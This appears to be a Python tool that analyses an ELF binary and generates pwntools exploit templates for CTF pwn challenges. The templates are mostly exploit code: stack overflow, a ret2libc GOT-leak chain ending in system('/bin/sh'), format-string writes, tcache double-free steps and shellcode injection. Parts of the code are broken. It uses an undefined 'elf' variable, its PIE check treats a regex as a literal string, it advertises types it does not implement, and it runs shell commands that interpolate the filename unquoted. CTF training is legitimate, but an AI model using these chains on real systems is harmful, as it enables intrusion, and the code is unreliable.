#!/usr/bin/env python3
"""
pwntools_template.py — Generate pwntools exploit templates for CTF pwn challenges.
Analyses the binary and outputs a ready-to-edit exploit.py.
Usage: python3 pwntools_template.py <binary> [--type TYPE] [--output exploit.py]
Types: stack, heap, format, ret2libc, rop, shellcode, blind
"""

import sys
import re
import subprocess
import argparse
from pathlib import Path


def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return r.stdout + r.stderr
    except Exception:
        return ''


def get_binary_info(binary):
    info = {}
    out = run(f'readelf -h "{binary}" 2>/dev/null')
    info['64bit'] = 'ELF64' in run(f'file "{binary}"')
    info['pie']   = 'Type:.*DYN' in run(f'readelf -h "{binary}"')
    info['canary'] = '__stack_chk_fail' in run(f'readelf -s "{binary}" 2>/dev/null')
    info['nx']    = True  # assume unless explicitly disabled

    # Find functions
    sym_out = run(f'nm "{binary}" 2>/dev/null || readelf -s "{binary}" 2>/dev/null')
    interesting_fns = re.findall(r'[0-9a-f]+ [Tt] (\w+)', sym_out)
    info['functions'] = [f for f in interesting_fns
                         if any(kw in f.lower() for kw in
                                ('vuln', 'win', 'flag', 'shell', 'secret', 'admin',
                                 'check', 'auth', 'backdoor', 'overflow', 'read', 'gets',
                                 'scanf', 'main', 'menu', 'login'))]
    return info


def generate_template(binary, exploit_type, info):
    name = Path(binary).name
    bits = 64 if info.get('64bit') else 32
    arch = f'amd64' if bits == 64 else 'i386'
    word = 'p64' if bits == 64 else 'p32'
    reg  = 'rip' if bits == 64 else 'eip'
    sp   = 'rsp' if bits == 64 else 'esp'

    header = f'''#!/usr/bin/env python3
from pwn import *

# ── Target ────────────────────────────────────────────────────────────────────
binary  = "./{name}"
elf     = ELF(binary, checksec=False)
context.binary = elf
context.arch   = "{arch}"
context.log_level = "info"

# Uncomment when connecting remotely:
# HOST, PORT = "challenge.server.com", 1337

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(binary)

# ── Offset finding ────────────────────────────────────────────────────────────
# Run: cyclic(200) | ./binary   then check ${reg} in GDB
# In GDB: cyclic_find(0x6161616e)
OFFSET = 0  # ← SET THIS

'''

    interesting = '\n'.join(f'# {f}  @ {hex(elf.sym.get(f, 0))}' for f in info.get('functions', [])[:10]) if info.get('functions') else ''
    if interesting:
        header += f"# Interesting functions found:\n{interesting}\n\n"

    templates = {
        'stack': f'''{header}
# ── Stack buffer overflow → overwrite return address ─────────────────────────
def exploit():
    p = conn()

    # 1. Fill buffer up to saved RIP
    payload  = b"A" * OFFSET

    # 2. Overwrite return address
    # Option A — ret2win (jump to win function if present)
    # payload += {word}(elf.sym["win"])

    # Option B — ret2libc
    # payload += {word}(pop_rdi) + {word}(binsh_addr) + {word}(elf.plt["system"])

    # Option C — shellcode (if NX disabled)
    # sc = asm(shellcraft.sh())
    # payload += {word}(jmp_esp_addr) + sc

    p.sendlineafter(b":", payload)
    p.interactive()

exploit()
''',

        'ret2libc': f'''{header}
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
# Or: libc = ELF("./libc.so.6")

# ── ret2libc via GOT leak ─────────────────────────────────────────────────────
def exploit():
    p = conn()

    # Find ROP gadgets: python3 rop_finder.py ./{name} --chain ret2libc
    pop_rdi = elf.search(asm("pop rdi; ret")).__next__()  # or hardcode
    ret_gadget = pop_rdi + 1  # bare ret (for stack alignment on Ubuntu)

    # Stage 1: Leak libc via puts(puts@GOT)
    payload  = b"A" * OFFSET
    payload += {word}(pop_rdi)
    payload += {word}(elf.got["puts"])
    payload += {word}(elf.plt["puts"])
    payload += {word}(elf.sym["main"])  # return to main for stage 2

    p.sendlineafter(b":", payload)
    leak = u{'64' if bits==64 else '32'}(p.recvline().strip().ljust({bits//8}, b"\\x00"))
    libc.address = leak - libc.sym["puts"]
    log.success(f"libc base: {{libc.address:#x}}")

    # Stage 2: system("/bin/sh")
    binsh = next(libc.search(b"/bin/sh"))
    payload2  = b"A" * OFFSET
    payload2 += {word}(ret_gadget)     # alignment
    payload2 += {word}(pop_rdi)
    payload2 += {word}(binsh)
    payload2 += {word}(libc.sym["system"])

    p.sendlineafter(b":", payload2)
    p.interactive()

exploit()
''',

        'format': f'''{header}
# ── Format string exploit ─────────────────────────────────────────────────────
# Step 1: find your input offset:  AAAA.%p.%p.%p.%p... until you see 0x41414141
FORMAT_OFFSET = 0  # ← stack position of your input (e.g. 6)

def exploit():
    p = conn()

    # --- Leak a pointer to defeat ASLR/PIE ---
    # leak = fmtstr_payload(FORMAT_OFFSET, {{elf.got["puts"]: 0}}, write_size="byte")
    # p.sendline(b"%{}$p".format(FORMAT_OFFSET).encode())
    # leak = int(p.recvline().strip(), 16)

    # --- Arbitrary write via format string ---
    target  = elf.got["exit"]   # or any writable pointer
    new_val = elf.sym["win"]    # function to redirect to
    payload = fmtstr_payload(FORMAT_OFFSET, {{target: new_val}})

    p.sendlineafter(b":", payload)
    p.interactive()

exploit()
''',

        'heap': f'''{header}
# ── Heap exploit template (tcache/fastbin) ────────────────────────────────────
# Typical primitives: alloc(size), free(idx), write(idx, data), read(idx)

def alloc(p, size, data=b""):
    # Interact with the heap menu to allocate
    pass  # adapt to actual binary menu

def free_chunk(p, idx):
    pass

def write_chunk(p, idx, data):
    pass

def read_chunk(p, idx):
    pass

def exploit():
    p = conn()
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

    # tcache dup / double-free (pre-libc 2.32):
    #   alloc(p, 0x20)   → chunk A (idx 0)
    #   alloc(p, 0x20)   → chunk B (idx 1)
    #   free(p, 0)       → tcache[0x20] → A
    #   free(p, 0)       → double free! tcache[0x20] → A → A
    #   alloc(p, 0x20)   → get A back, write target address into fd
    #   alloc(p, 0x20)   → get A again (now fd poisoned)
    #   alloc(p, 0x20)   → get target address as a chunk → write!

    # House of Force, fastbin dup, unsorted bin attack patterns
    # depend on libc version — check with: libc.sym["__malloc_hook"]

    p.interactive()

exploit()
''',

        'shellcode': f'''{header}
# ── Shellcode injection (NX disabled) ────────────────────────────────────────
def exploit():
    p = conn()

    sc = asm(shellcraft.sh())  # or shellcraft.linux.sh()
    log.info(f"Shellcode: {{len(sc)}} bytes")

    # Find jmp/call esp (or rsp) gadget:
    # ROPgadget --binary ./{name} | grep "jmp esp"
    jmp_esp = 0xdeadbeef  # ← SET THIS

    payload  = sc
    payload += b"A" * (OFFSET - len(sc))
    payload += {word}(jmp_esp)

    p.sendlineafter(b":", payload)
    p.interactive()

exploit()
''',
    }

    return templates.get(exploit_type, templates['stack'])


def main():
    ap = argparse.ArgumentParser(description='pwntools Exploit Template Generator')
    ap.add_argument('binary', help='Target ELF binary')
    ap.add_argument('--type', '-t', default='stack',
                    choices=['stack', 'ret2libc', 'format', 'heap', 'shellcode'],
                    help='Exploit type (default: stack)')
    ap.add_argument('--output', '-o', default=None,
                    help='Output file (default: exploit.py)')
    args = ap.parse_args()

    info = get_binary_info(args.binary)
    print(f"[*] Binary: {args.binary}")
    print(f"[*] Arch: {'64-bit' if info['64bit'] else '32-bit'}")
    print(f"[*] Canary: {info['canary']}  PIE: {info['pie']}")
    if info['functions']:
        print(f"[*] Interesting functions: {info['functions']}")

    template = generate_template(args.binary, args.type, info)

    outfile = args.output or 'exploit.py'
    Path(outfile).write_text(template)
    print(f"\n[+] Template written to: {outfile}")
    print(f"    Edit OFFSET and addresses, then: python3 {outfile}")
    print(f"\n[NEXT STEPS]")
    print(f"  1. Find offset:  python3 -c \"from pwn import *; print(cyclic(200))\" | ./{Path(args.binary).name}")
    print(f"  2. GDB:          gdb ./{Path(args.binary).name} → run → cyclic_find($rsp value)")
    print(f"  3. Checksec:     python3 checksec.py ./{Path(args.binary).name}")
    print(f"  4. Gadgets:      python3 rop_finder.py ./{Path(args.binary).name}")
    print(f"  5. Ghidra:       Open binary, find vulnerable function, note overflow distance")


if __name__ == '__main__':
    main()
